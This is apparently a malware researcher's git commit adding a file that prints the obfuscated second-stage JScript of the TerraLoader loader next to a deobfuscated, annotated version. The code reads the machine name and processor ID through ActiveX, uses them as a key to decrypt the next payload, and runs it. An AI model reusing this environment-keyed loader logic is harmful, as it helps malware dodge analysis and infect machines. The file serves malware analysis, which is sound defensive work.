f17de481e27dc0e461847231da91afe35053fcad
StrangerealIntel <54320855+StrangerealIntel@users.noreply.github.com>
2020-09-03 16:35:08 +0200

    Create Terraloader_layer2.js

---
+++ Terraloader/2020-09-03/Terraloader_layer2.js
@@ -0,0 +1,258 @@
+/*
+####################################################################################################################################################################################
+#### Layer 2 : 59e9bbc1b7352ae4d5f183f5a6b698c7b9a5a0cf082a882020ec40d63d0847b5
+####################################################################################################################################################################################
+*/
+
+/*
+values in memory :
+vysiria431 = 'pIkLWdM]n:bfI2Pt';
+vysiria7633 = '#F+l}D&2H';
+vysiria6669 = 'pIkLWdM]mdsm2}TupbA';
+vysiria69 = '#F+l}D&2[i+u}2y7!$H!jq+uF';
+offset_tab -> 9
+tabex -> 113,111,97,99,80,73,54,49,49,85,83,69,82,45,80,67,120,56,54,32,70,97,109,105,108,121,32,54,32,77,111,100,101,108,32,57,52,32,83,116,101,112,112,105,110,103,32,51,44,32,71,101,110,117,105,110,101,73,110,116,101,108
+*/
+
+function vysiria714(vysiria1){var vysiria8647;if (vysiria1){switch (vysiria1){case " ":vysiria8647 = 32;break;case "!":vysiria8647 = 33;break;case '"':vysiria8647 = 34;break;case "#":vysiria8647 = 35;break;case "$":vysiria8647 = 36;break;case "%":vysiria8647 = 37;break;case "&":vysiria8647 = 38;break;case "'":vysiria8647 = 39;break;case "(":vysiria8647 = 40;break;case ")":vysiria8647 = 41;break;case "*":vysiria8647 = 42;break;case "+":vysiria8647 = 43;break;case ",":vysiria8647 = 44;break;case "-":vysiria8647 = 45;break;case ".":vysiria8647 = 46;break;case "/":vysiria8647 = 47;break;case "0":vysiria8647 = 48;break;case "1":vysiria8647 = 49;break;case "2":vysiria8647 = 50;break;case "3":vysiria8647 = 51;break;case "4":vysiria8647 = 52;break;case "5":vysiria8647 = 53;break;case "6":vysiria8647 = 54;break;case "7":vysiria8647 = 55;break;case "8":vysiria8647 = 56;break;case "9":vysiria8647 = 57;break;case ":":vysiria8647 = 58;break;case ";":vysiria8647 = 59;break;case "<":vysiria8647 = 60;break;case "=":vysiria8647 = 61;break;case ">":vysiria8647 = 62;break;case "?":vysiria8647 = 63;break;case "@":vysiria8647 = 64;break;case "A":vysiria8647 = 65;break;case "B":vysiria8647 = 66;break;case "C":vysiria8647 = 67;break;case "D":vysiria8647 = 68;break;case "E":vysiria8647 = 69;break;case "F":vysiria8647 = 70;break;case "G":vysiria8647 = 71;break;case "H":vysiria8647 = 72;break;case "I":vysiria8647 = 73;break;case "J":vysiria8647 = 74;break;case "K":vysiria8647 = 75;break;case "L":vysiria8647 = 76;break;case "M":vysiria8647 = 77;break;case "N":vysiria8647 = 78;break;case "O":vysiria8647 = 79;break;case "P":vysiria8647 = 80;break;case "Q":vysiria8647 = 81;break;case "R":vysiria8647 = 82;break;case "S":vysiria8647 = 83;break;case "T":vysiria8647 = 84;break;case "U":vysiria8647 = 85;break;case "V":vysiria8647 = 86;break;case "W":vysiria8647 = 87;break;case "X":vysiria8647 = 88;break;case "Y":vysiria8647 = 89;break;case "Z":vysiria8647 = 90;break;case "[":vysiria8647 = 91;break;case "\\":vysiria8647 = 92;break;case "]":vysiria8647 = 93;break;case "^":vysiria8647 = 94;break;case "_":vysiria8647 = 95;break;case "`":vysiria8647 = 96;break;case "a":vysiria8647 = 97;break;case "b":vysiria8647 = 98;break;case "c":vysiria8647 = 99;break;case "d":vysiria8647 = 100;break;case "e":vysiria8647 = 101;break;case "f":vysiria8647 = 102;break;case "g":vysiria8647 = 103;break;case "h":vysiria8647 = 104;break;case "i":vysiria8647 = 105;break;case "j":vysiria8647 = 106;break;case "k":vysiria8647 = 107;break;case "l":vysiria8647 = 108;break;case "m":vysiria8647 = 109;break;case "n":vysiria8647 = 110;break;case "o":vysiria8647 = 111;break;case "p":vysiria8647 = 112;break;case "q":vysiria8647 = 113;break;case "r":vysiria8647 = 114;break;case "s":vysiria8647 = 115;break;case "t":vysiria8647 = 116;break;case "u":vysiria8647 = 117;break;case "v":vysiria8647 = 118;break;case "w":vysiria8647 = 119;break;case "x":vysiria8647 = 120;break;case "y":vysiria8647 = 121;break;case "z":vysiria8647 = 122;break;case "{":vysiria8647 = 123;break;case "|":vysiria8647 = 124;break;case "}":vysiria8647 = 125;break;case "~":vysiria8647 = 126;break;}return vysiria8647;}}function vysiria34(vysiria027) {return new ActiveXObject(vysiria027);}function vysiria241(){try {var vysiria186 = vysiria34(vysiria052(vysiria431, vysiria827, vysiria642, (507 - 491)));var vysiria3856 = vysiria186.Environment(vysiria052(vysiria7633, vysiria827, vysiria642, (5648 - 5639)));var vysiria812 = vysiria34(vysiria052(vysiria6669, vysiria827, vysiria642, (8186 - 8167)));var vysiria173 = vysiria812.ComputerName + vysiria3856(vysiria052(vysiria69, vysiria827, vysiria642, (9565 - 9540)));return vysiria173;} catch(vysiria39) {return false;}}try {var vysiria73 = vysiria241();vysiria431 = "";vysiria7633 = "";vysiria6669 = "";vysiria69 = "";var vysiria7612 = vysiria73.length;var vysiria37 = vysiria73.split("");vysiria827[vysiria642] = vysiria714(vysiria37[0]);var vysiria2201 = 1;do {vysiria827[vysiria642 + vysiria2201] = vysiria714(vysiria37[vysiria2201]);vysiria2201 = vysiria2201 + 1;} while (vysiria2201 < vysiria7612);vysiria73 = "";vysiria37 = [];vysiria24(vysiria052(vysiria754, vysiria827, vysiria642 + vysiria7612, (41003 + 9309)));} catch(vysiria413){vysiria754 = '';}
+
+/*
+####################################################################################################################################################################################
+#### Layer 2 Clearned 
+####################################################################################################################################################################################
+*/
+
+function SwitchKey(arg)
+{
+    var str;
+    if (arg){switch (arg)
+        {
+            case " ":str = 32;
+        break;
+        case "!":str = 33;
+        break;
+        case '"':str = 34;
+        break;
+        case "#":str = 35;
+        break;
+        case "$":str = 36;
+        break;
+        case "%":str = 37;
+        break;
+        case "&":str = 38;
+        break;
+        case "'":str = 39;
+        break;
+        case "(":str = 40;
+        break;
+        case ")":str = 41;
+        break;
+        case "*":str = 42;
+        break;
+        case "+":str = 43;
+        break;
+        case ",":str = 44;
+        break;
+        case "-":str = 45;
+        break;
+        case ".":str = 46;
+        break;
+        case "/":str = 47;
+        break;
+        case "0":str = 48;
+        break;
+        case "1":str = 49;
+        break;
+        case "2":str = 50;
+        break;
+        case "3":str = 51;
+        break;
+        case "4":str = 52;
+        break;
+        case "5":str = 53;
+        break;
+        case "6":str = 54;
+        break;
+        case "7":str = 55;
+        break;
+        case "8":str = 56;
+        break;
+        case "9":str = 57;
+        break;
+        case ":":str = 58;
+        break;
+        case ";":str = 59;
+        break;
+        case "<":str = 60;
+        break;
+        case "=":str = 61;
+        break;
+        case ">":str = 62;
+        break;
+        case "?":str = 63;
+        break;
+        case "@":str = 64;
+        break;
+        case "A":str = 65;
+        break;
+        case "B":str = 66;
+        break;
+        case "C":str = 67;
+        break;
+        case "D":str = 68;
+        break;
+        case "E":str = 69;
+        break;
+        case "F":str = 70;
+        break;
+        case "G":str = 71;
+        break;
+        case "H":str = 72;
+        break;
+        case "I":str = 73;
+        break;
+        case "J":str = 74;
+        break;
+        case "K":str = 75;
+        break;
+        case "L":str = 76;
+        break;
+        case "M":str = 77;
+        break;
+        case "N":str = 78;
+        break;
+        case "O":str = 79;
+        break;
+        case "P":str = 80;
+        break;
+        case "Q":str = 81;
+        break;
+        case "R":str = 82;
+        break;
+        case "S":str = 83;
+        break;
+        case "T":str = 84;
+        break;
+        case "U":str = 85;
+        break;
+        case "V":str = 86;
+        break;
+        case "W":str = 87;
+        break;
+        case "X":str = 88;
+        break;
+        case "Y":str = 89;
+        break;
+        case "Z":str = 90;
+        break;
+        case "[":str = 91;
+        break;
+        case "\\":str = 92;
+        break;
+        case "]":str = 93;
+        break;
+        case "^":str = 94;
+        break;
+        case "_":str = 95;
+        break;
+        case "`":str = 96;
+        break;
+        case "a":str = 97;
+        break;
+        case "b":str = 98;
+        break;
+        case "c":str = 99;
+        break;
+        case "d":str = 100;
+        break;
+        case "e":str = 101;
+        break;
+        case "f":str = 102;
+        break;
+        case "g":str = 103;
+        break;
+        case "h":str = 104;
+        break;
+        case "i":str = 105;
+        break;
+        case "j":str = 106;
+        break;
+        case "k":str = 107;
+        break;
+        case "l":str = 108;
+        break;
+        case "m":str = 109;
+        break;
+        case "n":str = 110;
+        break;
+        case "o":str = 111;
+        break;
+        case "p":str = 112;
+        break;
+        case "q":str = 113;
+        break;
+        case "r":str = 114;
+        break;
+        case "s":str = 115;
+        break;
+        case "t":str = 116;
+        break;
+        case "u":str = 117;
+        break;
+        case "v":str = 118;
+        break;
+        case "w":str = 119;
+        break;
+        case "x":str = 120;
+        break;
+        case "y":str = 121;
+        break;
+        case "z":str = 122;
+        break;
+        case "{":str = 123;
+        break;
+        case "|":str = 124;
+        break;
+        case "}":str = 125;
+        break;
+        case "~":str = 126;
+        break;
+        }
+    return str;
+    }
+}
+function Get_ActXObj(a) {return new ActiveXObject(a);}
+function Get_Sys_Info()
+{
+    try 
+    {
+        var ShObj = Get_ActXObj("WScript.Shell");
+        var List_Process = ShObj.Environment("PROCESS");
+        var NetObj = Get_ActXObj("WScript.Network");
+        var Sys_Info = NetObj.ComputerName + List_Process("PROCESSOR_IDENTIFIER");
+        return Sys_Info;
+    }
+    catch(e) {return false;}
+}
+try 
+{
+    var Data_Sys_Info = Get_Sys_Info();
+    // for the next stage
+    vysiria431 = "";
+    vysiria7633 = "";
+    vysiria6669 = "";
+    vysiria69 = "";
+    var l = Data_Sys_Info.length;
+    var d = Data_Sys_Info.split("");
+    tabex[offset_tab] = SwitchKey(d[0]);
+    var i = 1;
+    do 
+    {
+        tabex[offset_tab + i] = SwitchKey(d[i]);
+        i = i + 1;
+    } while (i < l);
+    Data_Sys_Info = "";
+    d = [];
+    Exec(Init(Pay_lay2, tabex, offset_tab + l, 50312));
+}
+catch(e){Pay_lay2 = '';}
